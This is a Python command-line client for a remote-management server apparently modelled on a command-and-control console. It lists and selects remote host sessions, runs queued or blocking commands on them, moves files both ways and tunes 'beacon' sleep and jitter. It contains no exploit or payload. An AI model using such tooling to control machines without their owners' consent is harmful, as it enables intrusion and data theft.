#!/usr/bin/env python3
"""
RMM operator CLI — talks to the server REST API (/api/v1/).

Examples:
  python rmm_cli.py sessions list
  python rmm_cli.py session use abc12345
  python rmm_cli.py exec whoami --wait 120
  python rmm_cli.py run "dir C:\\" --json
  python rmm_cli.py config set-sleep 30
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import sys
import urllib.error
import urllib.request
from pathlib import Path

DEFAULT_URL = os.environ.get("RMM_SERVER_URL", "http://127.0.0.1:8080").rstrip("/")
DEFAULT_TOKEN = os.environ.get("RMM_API_TOKEN", "").strip()
STATE_FILE = os.path.expanduser("~/.rmm_cli_state.json")


class RmmApiClient:
    def __init__(self, base_url: str, token: str = ""):
        self.base_url = base_url.rstrip("/")
        self.token = token.strip()

    def _headers(self, extra: dict | None = None) -> dict:
        h = {"Accept": "application/json"}
        if self.token:
            h["Authorization"] = f"Bearer {self.token}"
        if extra:
            h.update(extra)
        return h

    def request(self, method: str, path: str, body: dict | None = None, timeout: float = 30):
        url = f"{self.base_url}{path}"
        data = None
        headers = self._headers()
        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                raw = resp.read().decode(errors="replace")
                if not raw.strip():
                    return resp.status, {}
                return resp.status, json.loads(raw)
        except urllib.error.HTTPError as e:
            raw = e.read().decode(errors="replace")
            try:
                payload = json.loads(raw) if raw.strip() else {}
            except json.JSONDecodeError:
                payload = {"error": raw or e.reason}
            return e.code, payload

    def health(self):
        return self.request("GET", "/api/v1/health")

    def list_sessions(self):
        return self.request("GET", "/api/v1/sessions")

    def get_session(self, session_id: str):
        return self.request("GET", f"/api/v1/sessions/{session_id}")

    def kill_session(self, session_id: str):
        return self.request("DELETE", f"/api/v1/sessions/{session_id}")

    def queue_command(self, session_id: str, command: str, cmd_type: str = "oneshot"):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/commands",
            {"command": command, "type": cmd_type},
        )

    def exec_command(self, session_id: str, command: str, timeout: float = 120):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/exec",
            {"command": command, "timeout": timeout},
            timeout=timeout + 5,
        )

    def patch_config(self, session_id: str, sleep_seconds=None, jitter_percent=None):
        body = {}
        if sleep_seconds is not None:
            body["sleep_seconds"] = sleep_seconds
        if jitter_percent is not None:
            body["jitter_percent"] = jitter_percent
        return self.request("PATCH", f"/api/v1/sessions/{session_id}/config", body)

    def upload_file(self, session_id: str, local_path: str, remote_path: str):
        content = base64.b64encode(Path(local_path).read_bytes()).decode()
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/upload",
            {"content_b64": content, "remote_path": remote_path},
        )

    def get_events(self, session_id: str, since: int = 0, limit: int = 50):
        return self.request(
            "GET",
            f"/api/v1/sessions/{session_id}/events?since={since}&limit={limit}",
        )


def load_state() -> dict:
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, encoding="utf-8") as f:
            return json.load(f)
    return {}


def save_state(state: dict):
    with open(STATE_FILE, "w", encoding="utf-8") as f:
        json.dump(state, f, indent=2)


def current_session(state: dict) -> str | None:
    return state.get("current_session")


def set_current_session(state: dict, session_id: str):
    state["current_session"] = session_id
    save_state(state)


def die(msg: str, code: int = 1):
    print(msg, file=sys.stderr)
    sys.exit(code)


def require_session(state: dict, session_arg: str | None) -> str:
    sid = session_arg or current_session(state)
    if not sid:
        die("No session selected. Run: rmm_cli.py session use <id>")
    return sid


def print_json(data):
    print(json.dumps(data, indent=2))


def cmd_health(client: RmmApiClient, args):
    code, data = client.health()
    if args.json:
        print_json({"status": code, **data})
    elif code == 200:
        print(f"ok ({data.get('sessions', 0)} sessions)")
    else:
        die(f"health failed ({code}): {data}")


def cmd_sessions_list(client: RmmApiClient, args):
    code, data = client.list_sessions()
    if code != 200:
        die(f"sessions list failed ({code}): {data}")
    if args.json:
        print_json(data)
        return
    sessions = data.get("sessions", [])
    if not sessions:
        print("No active sessions")
        return
    print(f"{'ID':<10} {'User':<15} {'Host':<20} {'Sleep':<8} {'Jitter':<8} Last seen")
    print("-" * 85)
    for s in sessions:
        print(
            f"{s['id'][:8]:<10} {s['username']:<15} {s['hostname']:<20} "
            f"{s['sleep_seconds']:<8} {s['jitter_percent']:<7}% "
            f"{s['last_seen']}"
        )


def cmd_session_use(client: RmmApiClient, state: dict, args):
    code, data = client.get_session(args.session_id)
    if code != 200:
        die(f"session not found ({code}): {data}")
    sid = data["session"]["id"]
    set_current_session(state, sid)
    s = data["session"]
    print(f"Selected {s['username']}@{s['hostname']} [{sid[:8]}]")


def cmd_session_info(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.get_session(sid)
    if code != 200:
        die(f"session info failed ({code}): {data}")
    if args.json:
        print_json(data)
    else:
        s = data["session"]
        for k, v in s.items():
            print(f"  {k}: {v}")


def cmd_session_kill(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.kill_session(sid)
    if code != 200:
        die(f"kill failed ({code}): {data}")
    if state.get("current_session") == data.get("session_id"):
        state.pop("current_session", None)
        save_state(state)
    print(f"Killed session {data.get('session_id', sid)[:8]}")


def cmd_run(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.queue_command(sid, args.command, args.type)
    if code != 200:
        die(f"queue failed ({code}): {data}")
    if args.json:
        print_json(data)
    else:
        print("Command queued")


def cmd_exec(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    command = args.command
    if not command and args.command_file:
        command = Path(args.command_file).read_text(encoding="utf-8").strip()
    if not command:
        die("Missing command")
    code, data = client.exec_command(sid, command, timeout=args.wait)
    if code == 408:
        die(f"timeout after {args.wait}s", 2)
    if code != 200:
        die(f"exec failed ({code}): {data}")
    ev = data.get("event", {})
    if args.json:
        print_json(ev)
        return
    if ev.get("command"):
        print(f"[{ev.get('type')}] {ev['command']}")
    body = ev.get("body", "")
    if ev.get("artifact"):
        print(f"artifact: {ev['artifact']}")
    print(body)


def cmd_config_set_sleep(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.patch_config(sid, sleep_seconds=args.seconds)
    if code != 200:
        die(f"config failed ({code}): {data}")
    print(f"Sleep set to {args.seconds}s (effective on next beacon)")


def cmd_config_set_jitter(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.patch_config(sid, jitter_percent=args.percent)
    if code != 200:
        die(f"config failed ({code}): {data}")
    print(f"Jitter set to {args.percent}%")


def cmd_download(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.queue_command(sid, f"__DOWNLOAD__ {args.remote_path}")
    if code != 200:
        die(f"download queue failed ({code}): {data}")
    print("Download queued — check server RMM_logs/downloads/ or poll events")


def cmd_upload(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    if not os.path.isfile(args.local):
        die(f"Local file not found: {args.local}")
    code, data = client.upload_file(sid, args.local, args.remote)
    if code != 200:
        die(f"upload failed ({code}): {data}")
    print(f"Upload queued: {args.local} -> {args.remote}")


def cmd_events(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.get_events(sid, since=args.since, limit=args.limit)
    if code != 200:
        die(f"events failed ({code}): {data}")
    if args.json:
        print_json(data)
        return
    for ev in data.get("events", []):
        cmd = ev.get("command") or ""
        suffix = f" » {cmd}" if cmd else ""
        print(f"[{ev['id']}] {ev['timestamp']} {ev['type']}{suffix}")
        body = ev.get("body", "")
        if ev.get("artifact"):
            print(f"  artifact: {ev['artifact']}")
        if body:
            print(body.rstrip())
        print("-" * 40)


def build_parser() -> argparse.ArgumentParser:
    shared = argparse.ArgumentParser(add_help=False)
    shared.add_argument("--json", action="store_true", help="JSON output")

    p = argparse.ArgumentParser(description="RMM operator CLI (REST API client)")
    p.add_argument("--url", default=DEFAULT_URL, help=f"Server base URL (default: {DEFAULT_URL})")
    p.add_argument("--token", default=DEFAULT_TOKEN, help="API token (or RMM_API_TOKEN)")

    sub = p.add_subparsers(dest="command", required=True)

    sub.add_parser("health", parents=[shared], help="API health check").set_defaults(func=cmd_health)

    sp = sub.add_parser("sessions", help="Session management")
    sp_sub = sp.add_subparsers(dest="sessions_cmd", required=True)
    sp_list = sp_sub.add_parser("list", parents=[shared], help="List sessions")
    sp_list.set_defaults(func=cmd_sessions_list)

    sp = sub.add_parser("session", help="Select / inspect / kill a session")
    sp_sub = sp.add_subparsers(dest="session_cmd", required=True)
    sp_use = sp_sub.add_parser("use", help="Select session (prefix ok)")
    sp_use.add_argument("session_id")
    sp_use.set_defaults(func=cmd_session_use)
    sp_info = sp_sub.add_parser("info", parents=[shared], help="Session details")
    sp_info.add_argument("--session", "-s", default=None)
    sp_info.set_defaults(func=cmd_session_info)
    sp_kill = sp_sub.add_parser("kill", parents=[shared], help="Kill session")
    sp_kill.add_argument("--session", "-s", default=None)
    sp_kill.set_defaults(func=cmd_session_kill)

    sp_run = sub.add_parser("run", parents=[shared], help="Queue command (non-blocking)")
    sp_run.add_argument("command")
    sp_run.add_argument("--session", "-s", default=None)
    sp_run.add_argument("--type", choices=["oneshot", "persistent"], default="oneshot")
    sp_run.set_defaults(func=cmd_run)

    sp_exec = sub.add_parser("exec", parents=[shared], help="Run command and wait for output")
    sp_exec.add_argument("command", nargs="?", default=None)
    sp_exec.add_argument("-f", "--command-file", help="Read command from file")
    sp_exec.add_argument("--session", "-s", default=None)
    sp_exec.add_argument("--wait", type=float, default=120, help="Timeout seconds")
    sp_exec.set_defaults(func=cmd_exec)

    sp_cfg = sub.add_parser("config", help="Beacon configuration")
    sp_cfg_sub = sp_cfg.add_subparsers(dest="config_cmd", required=True)
    sp_sleep = sp_cfg_sub.add_parser("set-sleep", help="Set sleep interval (1-3600)")
    sp_sleep.add_argument("seconds", type=int)
    sp_sleep.add_argument("--session", "-s", default=None)
    sp_sleep.set_defaults(func=cmd_config_set_sleep)
    sp_jit = sp_cfg_sub.add_parser("set-jitter", help="Set jitter percent (0-100)")
    sp_jit.add_argument("percent", type=int)
    sp_jit.add_argument("--session", "-s", default=None)
    sp_jit.set_defaults(func=cmd_config_set_jitter)

    sp_dl = sub.add_parser("download", help="Queue remote file download")
    sp_dl.add_argument("remote_path")
    sp_dl.add_argument("--session", "-s", default=None)
    sp_dl.set_defaults(func=cmd_download)

    sp_ul = sub.add_parser("upload", help="Upload local file to remote path")
    sp_ul.add_argument("local")
    sp_ul.add_argument("remote")
    sp_ul.add_argument("--session", "-s", default=None)
    sp_ul.set_defaults(func=cmd_upload)

    sp_ev = sub.add_parser("events", parents=[shared], help="Poll session result events")
    sp_ev.add_argument("--session", "-s", default=None)
    sp_ev.add_argument("--since", type=int, default=0)
    sp_ev.add_argument("--limit", type=int, default=50)
    sp_ev.set_defaults(func=cmd_events)

    return p


def main():
    parser = build_parser()
    args = parser.parse_args()
    client = RmmApiClient(args.url, args.token)
    state = load_state()
    fn = args.func
    if fn is cmd_health:
        fn(client, args)
    else:
        fn(client, state, args)


if __name__ == "__main__":
    main()
